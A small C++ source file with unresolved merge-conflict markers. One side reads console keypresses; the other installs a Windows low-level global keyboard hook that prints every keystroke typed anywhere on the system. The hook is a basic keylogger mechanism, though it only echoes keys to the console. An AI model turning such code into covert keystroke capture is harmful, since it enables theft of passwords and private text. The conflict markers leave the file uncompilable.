<<<<<<< HEAD
// #include "HttpRequest.h"
// #include "ServerRequest.h"
#include <conio.h>
#include <stdio.h>
#include <iostream>

int main(int argc, char **argv)
{
    while (true)
    {
        if (kbhit() != 0)
        {
            std::cout << getch() << std::endl;
            std::cout << kbhit() << std::endl;
        }
    }
    return 0;
}
=======
#include <windows.h>
#include <iostream>

using namespace std;

HHOOK keyboard;
KBDLLHOOKSTRUCT keyboardstruct;

LRESULT __stdcall Callback(int keyboardcode, WPARAM wParam, LPARAM lParam){
    if (keyboardcode >= 0){
        keyboardstruct = *((KBDLLHOOKSTRUCT*)lParam);
        if (wParam == WM_KEYDOWN){
            char c = MapVirtualKey(keyboardstruct.vkCode, 2);
            cout << c << endl;}}
    return CallNextHookEx(keyboard, keyboardcode, wParam, lParam);}

void CreateHook(){
    keyboard = SetWindowsHookEx(WH_KEYBOARD_LL, Callback, NULL, 0);}

int WINAPI WinMain(HINSTANCE hinstance1, HINSTANCE hinstance2, LPSTR lpstr,int cmd){
    CreateHook();
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)){
        TranslateMessage(&msg);
        DispatchMessage(&msg);}
    return msg.wParam;}
>>>>>>> 3a3cbeb615d961b665d027c364373f5b810c4c4a
